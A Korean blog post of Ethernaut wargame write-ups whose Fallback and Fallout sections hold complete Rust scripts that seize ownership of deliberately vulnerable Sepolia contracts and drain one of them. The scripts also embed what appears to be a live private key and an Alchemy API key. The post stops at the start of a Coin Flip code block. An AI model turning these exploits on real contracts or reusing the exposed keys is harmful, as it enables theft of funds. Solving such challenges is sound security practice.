<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Ethernaut Write Ups" />
<meta name="author" content="anonymous" />
<meta property="og:locale" content="en" />
<meta name="description" content="개요" />
<meta property="og:description" content="개요" />
<link rel="canonical" href="http://localhost:4000/posts/ethernaut/" />
<meta property="og:url" content="http://localhost:4000/posts/ethernaut/" />
<meta property="og:site_name" content="Web3.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-16T00:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Ethernaut Write Ups" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"anonymous"},"dateModified":"2025-01-16T00:00:00+09:00","datePublished":"2025-01-16T00:00:00+09:00","description":"개요","headline":"Ethernaut Write Ups","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ethernaut/"},"url":"http://localhost:4000/posts/ethernaut/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Ethernaut Write Ups | Web3.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web3.0">
<meta name="application-name" content="Web3.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/eth.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web3.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Decentralize my life</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://etherscan.io/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Ethernaut Write Ups</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Ethernaut Write Ups</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736953200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan 16, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                anonymous
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4514 words"
>
  <em>25 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="개요"><span class="me-2">개요</span><a href="#개요" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2Fc76b80cc-97e0-4a96-8897-685ae1d7e775%2F%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-01-17_00.34.27.png/size/w=2000?exp=1737128118&amp;sig=59S46PpS4tW2OWM4hBDu_5LSobRGG9DNsE0A3j7Z_qo" class="popup img-link  shimmer"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2Fc76b80cc-97e0-4a96-8897-685ae1d7e775%2F%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-01-17_00.34.27.png/size/w=2000?exp=1737128118&amp;sig=59S46PpS4tW2OWM4hBDu_5LSobRGG9DNsE0A3j7Z_qo" alt="" loading="lazy"></a></p>

<p>1년동안 안 하다가 다시 시작했다. 올해 목표 중 하나가 컨트랙트 취약점 제보해서 바운티 받는 것.</p>

<h2 id="fallback"><span class="me-2">Fallback</span><a href="#fallback" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-rust highlighter-rouge"><div class="code-header">
        <span data-label-text="Rust"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">str</span><span class="p">::</span><span class="n">FromStr</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">secp256k1</span><span class="p">::</span><span class="n">SecretKey</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">web3</span><span class="p">::{</span>
    <span class="nn">contract</span><span class="p">::{</span><span class="n">Contract</span><span class="p">,</span> <span class="n">Options</span><span class="p">},</span>
    <span class="nn">types</span><span class="p">::{</span><span class="n">Address</span><span class="p">,</span> <span class="n">TransactionParameters</span><span class="p">},</span>
    <span class="nn">signing</span><span class="p">::</span><span class="n">SecretKeyRef</span><span class="p">,</span>
    <span class="nn">ethabi</span><span class="p">::</span><span class="nn">ethereum_types</span><span class="p">::</span><span class="n">U256</span><span class="p">,</span>
<span class="p">};</span>

<span class="nd">#[tokio::main]</span>
<span class="k">async</span> <span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nn">web3</span><span class="p">::</span><span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span> <span class="p">{</span>
    <span class="k">let</span> <span class="n">http</span> <span class="o">=</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">transports</span><span class="p">::</span><span class="nn">Http</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"https://eth-sepolia.g.alchemy.com/v2/Nai14Kv-sBSyAwDaQ2QXUYxSaVPi8fNX"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">web3</span> <span class="o">=</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">Web3</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">http</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">user_address</span><span class="p">:</span> <span class="n">Address</span> <span class="o">=</span> <span class="s">"0x3a7D6Bc6f933eB5207c5C4Fe5ef47ad63815919c"</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
    <span class="k">let</span> <span class="n">balance</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.balance</span><span class="p">(</span><span class="n">user_address</span><span class="p">,</span> <span class="nb">None</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"Current Balance: {}"</span><span class="p">,</span> <span class="n">balance</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">contract_address</span><span class="p">:</span> <span class="n">Address</span> <span class="o">=</span> <span class="s">"0xd7d8B5e817a268Cd75269F3d0D913538A9aEF9F0"</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
    <span class="k">let</span> <span class="n">prvk</span> <span class="o">=</span> <span class="nn">SecretKey</span><span class="p">::</span><span class="nf">from_str</span><span class="p">(</span><span class="s">"d7420a930cdfbf67b841b475741e65fed7487e3483aaba1e36a48ce7b61c85c5"</span><span class="p">)</span>
        <span class="nf">.expect</span><span class="p">(</span><span class="s">"Invalid private key"</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">contract</span> <span class="o">=</span> <span class="nn">Contract</span><span class="p">::</span><span class="nf">from_json</span><span class="p">(</span>
        <span class="n">web3</span><span class="nf">.eth</span><span class="p">(),</span>
        <span class="n">contract_address</span><span class="p">,</span>
        <span class="nd">include_bytes!</span><span class="p">(</span><span class="s">"/home/pocas/web3.0/abi/Fallback.json"</span><span class="p">),</span>
    <span class="p">)</span><span class="nf">.expect</span><span class="p">(</span><span class="s">"Failed to load ABI"</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">base_gas_price</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.gas_price</span><span class="p">()</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">increased_gas_price</span> <span class="o">=</span> <span class="n">base_gas_price</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"Current gas price: {}"</span><span class="p">,</span> <span class="n">base_gas_price</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">tx</span> <span class="o">=</span> <span class="n">contract</span>
        <span class="nf">.signed_call</span><span class="p">(</span>
            <span class="s">"contribute"</span><span class="p">,</span>
            <span class="p">(),</span>
            <span class="n">Options</span> <span class="p">{</span>
                <span class="n">value</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="nn">U256</span><span class="p">::</span><span class="nf">exp10</span><span class="p">(</span><span class="mi">14</span><span class="p">)),</span>
                <span class="n">gas_price</span><span class="p">:</span>  <span class="nf">Some</span><span class="p">(</span><span class="n">increased_gas_price</span><span class="p">),</span>
                <span class="n">gas</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="mi">500_000</span><span class="nf">.into</span><span class="p">()),</span>
                <span class="o">..</span><span class="nn">Default</span><span class="p">::</span><span class="nf">default</span><span class="p">()</span>
            <span class="p">},</span>
            <span class="nn">SecretKeyRef</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prvk</span><span class="p">),</span>
        <span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>

    <span class="nd">println!</span><span class="p">(</span><span class="s">"Transaction sent for contribute: {:?}"</span><span class="p">,</span> <span class="n">tx</span><span class="p">);</span>

    <span class="nn">tokio</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="nf">sleep</span><span class="p">(</span><span class="nn">std</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="nn">Duration</span><span class="p">::</span><span class="nf">from_secs</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span><span class="k">.await</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">receipt</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.transaction_receipt</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">if</span> <span class="n">receipt</span><span class="nf">.is_none</span><span class="p">()</span> <span class="p">{</span>
        <span class="nd">println!</span><span class="p">(</span><span class="s">"First transaction is not mined yet."</span><span class="p">);</span>
        <span class="k">return</span> <span class="nf">Ok</span><span class="p">(());</span>
    <span class="p">}</span>

    <span class="k">let</span> <span class="n">base_gas_price</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.gas_price</span><span class="p">()</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">increased_gas_price</span> <span class="o">=</span> <span class="n">base_gas_price</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"Current gas price: {}"</span><span class="p">,</span> <span class="n">base_gas_price</span><span class="p">);</span>
    
    <span class="k">let</span> <span class="n">tx_object</span> <span class="o">=</span> <span class="n">TransactionParameters</span> <span class="p">{</span>
        <span class="n">to</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="n">contract_address</span><span class="p">),</span>
        <span class="n">value</span><span class="p">:</span> <span class="nn">U256</span><span class="p">::</span><span class="nf">exp10</span><span class="p">(</span><span class="mi">17</span><span class="p">),</span> <span class="c1">// 0.1 Ether</span>
        <span class="n">gas_price</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="n">increased_gas_price</span><span class="p">),</span> 
        <span class="o">..</span><span class="nn">Default</span><span class="p">::</span><span class="nf">default</span><span class="p">()</span>
    <span class="p">};</span>

    <span class="k">let</span> <span class="n">signed</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.accounts</span><span class="p">()</span>
        <span class="nf">.sign_transaction</span><span class="p">(</span><span class="n">tx_object</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prvk</span><span class="p">)</span>
        <span class="k">.await</span><span class="o">?</span><span class="p">;</span>

    <span class="k">let</span> <span class="n">tx</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.send_raw_transaction</span><span class="p">(</span><span class="n">signed</span><span class="py">.raw_transaction</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"Transaction sent for fallback: {:?}"</span><span class="p">,</span> <span class="n">tx</span><span class="p">);</span>

    <span class="nf">Ok</span><span class="p">(())</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">contribute()</code> 함수로 <code class="language-plaintext highlighter-rouge">contributions[msg.sender]</code>에 0 이상 금액을 넣고, Fallback 컨트랙트로 이더 전송해서 fallback 실행 시켜 주면 오너 탈취, 이후 withdraw로 돈 빼내면 된다.</p>

<h2 id="fallout"><span class="me-2">Fallout</span><a href="#fallout" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-rust highlighter-rouge"><div class="code-header">
        <span data-label-text="Rust"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">str</span><span class="p">::</span><span class="n">FromStr</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">secp256k1</span><span class="p">::</span><span class="n">SecretKey</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">web3</span><span class="p">::{</span>
    <span class="nn">contract</span><span class="p">::{</span><span class="n">Contract</span><span class="p">,</span> <span class="n">Options</span><span class="p">},</span>
    <span class="nn">types</span><span class="p">::{</span><span class="n">Address</span><span class="p">},</span>
    <span class="nn">signing</span><span class="p">::</span><span class="n">SecretKeyRef</span><span class="p">,</span>
    <span class="nn">ethabi</span><span class="p">::</span><span class="nn">ethereum_types</span><span class="p">::</span><span class="n">U256</span><span class="p">,</span>
<span class="p">};</span>

<span class="nd">#[tokio::main]</span>
<span class="k">async</span> <span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nn">web3</span><span class="p">::</span><span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span> <span class="p">{</span>
    <span class="k">let</span> <span class="n">http</span> <span class="o">=</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">transports</span><span class="p">::</span><span class="nn">Http</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"https://eth-sepolia.g.alchemy.com/v2/Nai14Kv-sBSyAwDaQ2QXUYxSaVPi8fNX"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">web3</span> <span class="o">=</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">Web3</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">http</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">user_address</span><span class="p">:</span> <span class="n">Address</span> <span class="o">=</span> <span class="s">"0x3a7D6Bc6f933eB5207c5C4Fe5ef47ad63815919c"</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
    <span class="k">let</span> <span class="n">contract_address</span><span class="p">:</span> <span class="n">Address</span> <span class="o">=</span> <span class="s">"0x4B1b25E7BdCcfc26Abda2a449bF9Bc476BF774a5"</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>

    <span class="nd">println!</span><span class="p">(</span><span class="s">"Current Balance: {}"</span><span class="p">,</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.balance</span><span class="p">(</span><span class="n">user_address</span><span class="p">,</span> <span class="nb">None</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">prvk</span> <span class="o">=</span> <span class="nn">SecretKey</span><span class="p">::</span><span class="nf">from_str</span><span class="p">(</span><span class="s">"d7420a930cdfbf67b841b475741e65fed7487e3483aaba1e36a48ce7b61c85c5"</span><span class="p">)</span><span class="nf">.expect</span><span class="p">(</span><span class="s">"Invalid private key"</span><span class="p">);</span>
    <span class="k">let</span> <span class="n">contract</span> <span class="o">=</span> <span class="nn">Contract</span><span class="p">::</span><span class="nf">from_json</span><span class="p">(</span><span class="n">web3</span><span class="nf">.eth</span><span class="p">(),</span><span class="n">contract_address</span><span class="p">,</span> <span class="nd">include_bytes!</span><span class="p">(</span><span class="s">"/home/pocas/web3.0/abi/abi.json"</span><span class="p">),)</span><span class="nf">.expect</span><span class="p">(</span><span class="s">"Failed to load ABI"</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">base_gas_price</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.gas_price</span><span class="p">()</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">increased_gas_price</span> <span class="o">=</span> <span class="n">base_gas_price</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"Current gas price: {}"</span><span class="p">,</span> <span class="n">base_gas_price</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">tx</span> <span class="o">=</span> <span class="n">contract</span>
        <span class="nf">.signed_call</span><span class="p">(</span>
            <span class="s">"Fal1out"</span><span class="p">,</span>
            <span class="p">(),</span>
            <span class="n">Options</span> <span class="p">{</span>
                <span class="n">value</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="nn">U256</span><span class="p">::</span><span class="nf">exp10</span><span class="p">(</span><span class="mi">14</span><span class="p">)),</span>
                <span class="n">gas_price</span><span class="p">:</span>  <span class="nf">Some</span><span class="p">(</span><span class="n">increased_gas_price</span><span class="p">),</span>
                <span class="n">gas</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="mi">500_000</span><span class="nf">.into</span><span class="p">()),</span>
                <span class="o">..</span><span class="nn">Default</span><span class="p">::</span><span class="nf">default</span><span class="p">()</span>
            <span class="p">},</span>
            <span class="nn">SecretKeyRef</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prvk</span><span class="p">),</span>
        <span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>

    <span class="nd">println!</span><span class="p">(</span><span class="s">"Transaction sent for contribute: {:?}"</span><span class="p">,</span> <span class="n">tx</span><span class="p">);</span>

    <span class="nn">tokio</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="nf">sleep</span><span class="p">(</span><span class="nn">std</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="nn">Duration</span><span class="p">::</span><span class="nf">from_secs</span><span class="p">(</span><span class="mi">15</span><span class="p">))</span><span class="k">.await</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">receipt</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.transaction_receipt</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">if</span> <span class="n">receipt</span><span class="nf">.is_none</span><span class="p">()</span> <span class="p">{</span>
        <span class="nd">println!</span><span class="p">(</span><span class="s">"First transaction is not mined yet."</span><span class="p">);</span>
        <span class="k">return</span> <span class="nf">Ok</span><span class="p">(());</span>
    <span class="p">}</span>

    <span class="nf">Ok</span><span class="p">(())</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>일반적으로 컨트랙트의 Owner은 컨트랙트가 생성될 때, constructor에서 설정되어야 하지만 <code class="language-plaintext highlighter-rouge">Fal1out()</code>라는 함수 내에서 누구나 설정을 할 수 있기 때문에 소유권을 훔칠 수 있다. 시발 이상하게 <code class="language-plaintext highlighter-rouge">contract.query()</code>로 owner 값 보려고 하면 에러가 발생한다. abi도 잘 있는데 이유를 모르겠다.</p>

<h2 id="coin-flip"><span class="me-2">Coin Flip</span><a href="#coin-flip" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
